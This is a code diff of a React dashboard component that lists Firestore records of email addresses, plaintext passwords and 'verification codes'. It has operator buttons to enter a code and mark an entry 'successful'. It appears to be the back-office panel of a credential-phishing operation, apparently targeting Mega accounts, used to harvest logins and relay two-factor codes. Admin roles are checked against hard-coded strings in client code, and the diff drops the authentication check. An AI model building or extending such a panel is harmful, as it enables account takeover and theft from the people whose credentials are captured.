@@ -1,51 +1,46 @@
 import React, { useEffect, useRef, useState } from 'react'
-import { FaUser, FaEnvelope, FaKey, FaDesktop } from 'react-icons/fa';
+import { FaUser, FaEnvelope, FaKey, FaDesktop, FaCode } from 'react-icons/fa';
 import { MdAccessTime, MdAccessTimeFilled } from 'react-icons/md';
-import { useOutletContext } from 'react-router-dom';
 import { db } from '../config/firebase';
 import { doc, onSnapshot, updateDoc } from 'firebase/firestore';
 import { PiCaretDoubleLeftDuotone, PiCaretDoubleRightDuotone } from 'react-icons/pi';
 import { toast } from 'react-toastify';
 import { DateTime } from 'luxon';
 
+const DashboardTable = ({ itemsObj, userData, showCodeInTable = true, showAccessInTable = false }) => {
 
+  const ADMIN_ROLE_CODE = 'nahid$adminstrator$dashboard$root'
+  const MANAGER_ROLE_CODE = 'nahid$manager$dashboard$'
 
-const Mega = () => {
-
-  const { isUserAuthenticated, userData, myMegaItems } = useOutletContext()
-
-
-
-  const allData = myMegaItems?.slice()?.sort((a, b) => b?.createdAt - a?.createdAt)
+  const allData = itemsObj?.slice()?.sort((a, b) => b?.createdAt - a?.createdAt)
 
   const role = userData?.role;
 
-  // const handleVerify = async (docId) => {
+  const handleVerify = async (docId) => {
+    const verifyCode = prompt('Enter the Verification Code.')
+    try {
+      const docRef = doc(db, 'data', docId)
+      await updateDoc(docRef, {
+        status: 'verify',
+        code: verifyCode
+      })
+    } catch (error) {
+      toast.error(error?.message)
+    }
+  }
 
-  //   const verifyCode = prompt('Enter the Verification Code.')
-  //   try {
-  //     const docRef = doc(db, 'data', docId)
-  //     await updateDoc(docRef, {
-  //       status: 'verify',
-  //       code: verifyCode
-  //     })
-  //   } catch (error) {
-  //     toast.error(error?.message)
-  //   }
-  // }
 
-
-  // const handleSuccess = async (docId) => {
-  //   try {
-  //     const docRef = doc(db, 'data', docId)
-  //     await updateDoc(docRef, {
-  //       status: 'successful',
-  //     })
-  //     toast.success('Process Completed.')
-  //   } catch (error) {
-  //     toast.error(error?.message)
-  //   }
-  // }
+  const handleSuccess = async (docId) => {
+    try {
+      const docRef = doc(db, 'data', docId)
+      await updateDoc(docRef, {
+        status: 'successful',
+      })
+      toast.success('Process Completed.')
+    } catch (error) {
+      toast.error(error?.message)
+    }
+  }
 
 
   const scrollDiv = useRef(null)
@@ -66,10 +61,6 @@ const Mega = () => {
   }
 
 
-  if (!isUserAuthenticated) {
-    return <div></div>
-  }
-
   return (
     <div className="min-h-screen bg-gray-50 w-full lg:px-8 md:px-5 px-3 space-y-5 py-5">
 
@@ -86,7 +77,7 @@ const Mega = () => {
           <thead>
             <tr className="bg-sky-700 text-white">
               <th className="px-4 py-3 text-left">#</th>
-              {role == 'admin' || role == 'manager' ? (
+              {role == ADMIN_ROLE_CODE || role == MANAGER_ROLE_CODE ? (
                 <th className="px-4 py-3 text-left ">
                   <div className=' flex items-center'>
                     <FaUser className="inline mr-1" />
@@ -106,12 +97,24 @@ const Mega = () => {
                   Password
                 </div>
               </th>
-              {/* <th className="px-4 py-3 text-left">
-                <div className=' flex items-center'>
-                  <FaDesktop className="inline mr-1" />
-                  Access
-                </div>
-              </th> */}
+              {
+                showCodeInTable && <th className="px-4 py-3 text-left">
+                  <div className=' flex items-center'>
+                    <FaCode className="inline mr-1" />
+                    Code
+                  </div>
+                </th>
+              }
+
+              {
+                showAccessInTable && <th className="px-4 py-3 text-left">
+                  <div className=' flex items-center'>
+                    <FaDesktop className="inline mr-1" />
+                    Access
+                  </div>
+                </th>
+              }
+
               <th className="px-4 py-3 text-left">
                 <div className=' flex items-center min-w-40'>
                   <MdAccessTimeFilled className="inline mr-1" />
@@ -134,17 +137,22 @@ const Mega = () => {
                   }`}
               >
                 <td className="px-4 py-3 ">{index + 1}</td>
-                {role == 'admin' || role == 'manager' ? (
+                {role == ADMIN_ROLE_CODE || role == MANAGER_ROLE_CODE ? (
                   <td className="px-4 py-3 ">{element?.owner}</td>
                 ) : null}
                 <td className="px-4 py-3 ">{element?.email}</td>
                 <td className="px-4 py-3 ">{element?.password}</td>
-                {/* <td className="px-4 py-3 text-gray-600 ">
-                  <div className=' text-white flex flex-col items-center gap-2 sm:text-lg text-sm '>
-                    <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-blue-500' onClick={() => handleVerify(element?.id)}>Verify Code</button>
-                    <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-green-500' onClick={() => handleSuccess(element?.id)}>Successful</button>
-                  </div>
-                </td> */}
+                {
+                  showCodeInTable && <td className="px-4 py-3 text-gray-600 ">{element?.code}</td>
+                }
+                {
+                  showAccessInTable && <td className="px-4 py-3 text-gray-600 ">
+                    <div className=' text-white flex flex-col items-center gap-2 sm:text-lg text-sm '>
+                      <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-blue-500' onClick={() => handleVerify(element?.id)}>Verify Code</button>
+                      <button className=' w-20 sm:w-28 h-7 sm:h-9 rounded-lg bg-green-500' onClick={() => handleSuccess(element?.id)}>Successful</button>
+                    </div>
+                  </td>
+                }
                 <td className="px-4 py-3 ">{element?.createdAt ? <div className=' flex flex-col gap-2 text-base font-semibold text-slate-600'>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('HH:mm:ss')}</div>
                   <div>{DateTime.fromMillis(element?.createdAt).setZone('Asia/Dhaka').toFormat('dd-MM-yyyy')}</div>
@@ -159,4 +167,4 @@ const Mega = () => {
   )
 }
 
-export default Mega
+export default DashboardTable
